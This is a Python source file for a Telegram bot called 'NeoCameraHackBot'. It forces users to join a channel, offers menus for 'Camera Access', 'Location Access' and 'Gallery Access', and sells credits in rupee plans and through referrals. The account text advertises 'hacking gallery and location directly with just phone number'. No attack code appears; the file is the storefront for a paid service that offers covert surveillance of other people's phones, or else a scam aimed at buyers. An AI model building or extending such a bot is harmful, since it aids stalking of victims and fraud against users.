from aiogram import Router, types, F
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
from config import FORCE_JOIN_CHANNELS, ADMIN_IDS
import database
import os
from emojis import Emojis

router = Router()

async def check_force_join(bot, user_id):
    if not FORCE_JOIN_CHANNELS:
        return True
    for channel in FORCE_JOIN_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{channel}", user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception:
            return False
    return True

def get_force_join_kb():
    builder = InlineKeyboardBuilder()
    
    # List of channel URLs provided by user
    channel_urls = [
        "https://t.me/+fzxXEYwGgl45ZDg1",
    ]

    btns = []
    for url in channel_urls:
        btns.append(InlineKeyboardButton(text="Jᴏɪɴ Cʜᴀɴɴᴇʟ", url=url, icon_custom_emoji_id=Emojis.get_id(Emojis.ROCKET)))

    # Dynamic Row logic for all buttons
    for i in range(0, len(btns), 2):
        builder.row(*btns[i:i+2])

    # Row 4: Vᴇʀɪғʏ Jᴏɪɴ
    builder.row(InlineKeyboardButton(
        text="Vᴇʀɪғʏ Jᴏɪɴ", 
        callback_data="check_joined", 
        icon_custom_emoji_id=Emojis.get_id(Emojis.CHECK)
    ))
    return builder.as_markup()

def get_main_menu_kb():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="Camera Access", callback_data="camera_access", icon_custom_emoji_id=Emojis.get_id(Emojis.EYE)),
        InlineKeyboardButton(text="Location Access", callback_data="location_access", icon_custom_emoji_id=Emojis.get_id(Emojis.MAP))
    )
    builder.row(InlineKeyboardButton(text="Gallery Access", callback_data="gallery_access", icon_custom_emoji_id=Emojis.get_id(Emojis.TRAFFIC_LIGHT)))
    builder.row(InlineKeyboardButton(text="Checking Account", callback_data="check_account", icon_custom_emoji_id=Emojis.get_id(Emojis.USER)))
    # Social links removed from here
    return builder.as_markup()

def get_language_kb():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="English", callback_data="set_lang_en", icon_custom_emoji_id=Emojis.get_id(Emojis.GLOBE)),
        InlineKeyboardButton(text="Hindi", callback_data="set_lang_hi", icon_custom_emoji_id=Emojis.get_id(Emojis.GLOBE))
    )
    return builder.as_markup()


@router.message(CommandStart())
async def start_cmd(message: types.Message):
    args = message.text.split()
    invited_by = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
    
    # Save user if new and handle referral
    if await database.add_user(message.from_user.id, message.from_user.full_name, invited_by):
        try:
            # Notify the inviter
            inviter_data = await database.get_user_data(invited_by)
            if inviter_data:
                await message.bot.send_message(
                    invited_by,
                    f"{Emojis.CONGRATS} <b>Congratulations!</b>\n\n"
                    f"{Emojis.USER} New user <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> joined using your referral link!\n\n"
                    f"{Emojis.TICKET} You earned <b>1 credit</b>!\n"
                    f"{Emojis.FOLDER} Total Invites: <b>{inviter_data['invites']}</b>\n"
                    f"{Emojis.CARD} Total Credits: <b>{inviter_data['credits']}</b>",
                    parse_mode="HTML"
                )
        except Exception:
            pass

    # Use local file for 100% reliability
    if os.path.exists("banner.jpg"):
        photo = FSInputFile("banner.jpg")
    else:
        # Fallback to GitHub Raw Link
        photo = "https://raw.githubusercontent.com/OGAbdulOfficial/SMM-PANEL-REPO/master/banner.jpg"
    
    # Wide-bubble hack: Using invisible Braille characters to force the 16:9 aspect ratio
    wide_padding = "⠀" * 60 

    caption_text = (
        f"{Emojis.WARNING} <b>To use this bot, you must first join our Telegram channels</b>\n\n"
        f"After successfully joining, click the {Emojis.LOCK} <b>Vᴇʀɪғʏ Jᴏɪɴ</b> button to confirm your bot membership and to continue.\n"
        f"<b>{wide_padding}</b>"
    )

    is_joined = await check_force_join(message.bot, message.from_user.id)
    if not is_joined:
        await message.answer_photo(photo, caption=caption_text, reply_markup=get_force_join_kb(), parse_mode="HTML")
    else:
        await show_terminal_menu(message)

@router.callback_query(F.data == "check_joined")
async def check_joined_cb(call: types.CallbackQuery):
    is_joined = await check_force_join(call.bot, call.from_user.id)
    if not is_joined:
        await call.answer("❌ JOIN ALL CHANNELS FIRST!", show_alert=True)
    else:
        await show_terminal_menu(call)

async def show_terminal_menu(message_or_call):
    # Using code-block/monospace for the box and welcome text
    text = (
        "<code>┌════════════════┐\n"
        "│ $ root@system: Access Granted ~│\n"
        "└════════════════┘</code>\n\n"
        f"{Emojis.HAMSA} <b>Welcome to advanced and powerful NeoCameraHackBot designed for penetrating and educational purpose.</b>\n\n"
        f"{Emojis.BULB} For video /tutorial\n"
        f"{Emojis.ROBOT} More Bots /bots\n\n"
        f"{Emojis.ROCKET} Select an option below to start"
    )
    
    if isinstance(message_or_call, types.Message):
        # Jab direct /start aaye aur user joined ho, tab image nahi sirf text menu.
        await message_or_call.answer(text, reply_markup=get_main_menu_kb(), parse_mode="HTML")
    else:
        # Jab user "Joined" button dabaye, toh purani banner wali photo delete hogi aur text menu aayega.
        if message_or_call.message.photo:
            try:
                await message_or_call.message.delete()
            except:
                pass
            await message_or_call.message.answer(text, reply_markup=get_main_menu_kb(), parse_mode="HTML")
        else:
            await message_or_call.message.edit_text(text, reply_markup=get_main_menu_kb(), parse_mode="HTML")

@router.callback_query(F.data == "check_account")
async def show_account_info(call: types.CallbackQuery):
    user_id = call.from_user.id
    user_data = await database.get_user_data(user_id)
    username = call.from_user.username or "User"
    bot_info = await call.bot.get_me()
    
    text = (
        f"Hey @{username} your account information :)\n\n"
        f"{Emojis.ID} <b>User ID</b> : <code>{user_id}</code>\n"
        f"{Emojis.USERS} <b>Invites</b> : {user_data['invites']}\n"
        f"{Emojis.CARD} <b>Credits</b> : {user_data['credits']}\n"
        f"{Emojis.LINK} <b>Invite Link</b> : <code>https://t.me/{bot_info.username}?start={user_id}</code>\n\n"
        f"{Emojis.LIGHTNING} Get more free credits ( to use it for hacking gallery and location directly with just phone number ) by inviting your friends {Emojis.ROCKET}\n\n"
        f"{Emojis.COOL} You can also buy credits from owner of bot in very cheap price\n"
        f"{Emojis.KING} @Danger_devil1917"
    )
    
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="Buy Credits", callback_data="buy_credits", icon_custom_emoji_id=Emojis.get_id(Emojis.CARD)))
    kb.row(InlineKeyboardButton(text="Change Language", callback_data="change_lang", icon_custom_emoji_id=Emojis.get_id(Emojis.GLOBE)))
    kb.row(InlineKeyboardButton(text="Back to Menu", callback_data="back_to_menu_real", icon_custom_emoji_id=Emojis.get_id(Emojis.BACK)))
    
    # Account info always called from text menu, so edit_text is correct
    await call.message.edit_text(text=text, reply_markup=kb.as_markup(), parse_mode="HTML")

def get_plans_text():
    return (
        f"{Emojis.CARD} <b>Buy Credit Plans</b>\n\n"
        f"Choose a plan below to upgrade your account and unlock more hacking power! ⚡\n\n"
        f"{Emojis.DIAMOND} <b>Starter Plan</b>: 10 Credits - ₹50\n"
        f"{Emojis.DIAMOND} <b>Pro Plan</b>: 50 Credits - ₹200\n"
        f"{Emojis.DIAMOND} <b>Ultra Plan</b>: 100 Credits - ₹350\n"
        f"{Emojis.KING} <b>Ultimate Plan</b>: Unlimited (30 Days) - ₹999\n\n"
        f"{Emojis.PIN} <i>Click a plan to contact the owner for purchase.</i>"
    )

def get_plans_kb(with_back=True):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Starter Plan (₹50)", url="https://t.me/Danger_devil1917", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Pro Plan (₹200)", url="https://t.me/Danger_devil1917", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Ultra Plan (₹350)", url="https://t.me/Danger_devil1917", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Ultimate Plan (₹999)", url="https://t.me/Danger_devil1917", icon_custom_emoji_id=Emojis.get_id(Emojis.KING)))
    if with_back:
        builder.row(InlineKeyboardButton(text="Back to Account", callback_data="check_account", icon_custom_emoji_id=Emojis.get_id(Emojis.BACK)))
    return builder

@router.callback_query(F.data == "buy_credits")
async def buy_credits_menu(call: types.CallbackQuery):
    await call.message.edit_text(get_plans_text(), reply_markup=get_plans_kb(with_back=True).as_markup(), parse_mode="HTML")
    await call.answer()

@router.message(Command("plans"))
async def plans_cmd(message: types.Message):
    await message.answer(get_plans_text(), reply_markup=get_plans_kb(with_back=False).as_markup(), parse_mode="HTML")

@router.message(Command("tutorial"))
async def tutorial_cmd(message: types.Message):
    video_id = await database.get_setting("tutorial_video")
    if video_id:
        await message.answer_video(video_id, caption="💡 <b>Here is your tutorial video!</b>", parse_mode="HTML")
    else:
        await message.answer("💡 <b>Tutorial Video coming soon!</b>\nStay tuned to our channels.", parse_mode="HTML")

@router.message(Command("bots"))
async def bots_list_cmd(message: types.Message):
    bots_text = await database.get_setting("bots_list")
    if bots_text:
        await message.answer(bots_text, parse_mode="HTML")
    else:
        text = (
            f"{Emojis.ROBOT} <b>More Amazing Bots by Us:</b>\n\n"
            "Coming soon...\n"
            "Check @Danger_devil1917 for updates!"
        )
        await message.answer(text, parse_mode="HTML")

@router.message()
async def auto_menu_handler(message: types.Message):
    # This handler catches any random text (like "hi") and shows the menu
    await start_cmd(message)

@router.callback_query(F.data == "back_to_menu_real")
async def back_to_menu_real(call: types.CallbackQuery):
    await show_terminal_menu(call)

@router.callback_query(F.data == "change_lang")
async def change_lang_cb(call: types.CallbackQuery):
    text = f"{Emojis.GLOBE} <b>Please choose your language:</b>"
    if call.message.photo:
        await call.message.edit_caption(caption=text, reply_markup=get_language_kb(), parse_mode="HTML")
    else:
        await call.message.edit_text(text=text, reply_markup=get_language_kb(), parse_mode="HTML")
    await call.answer()
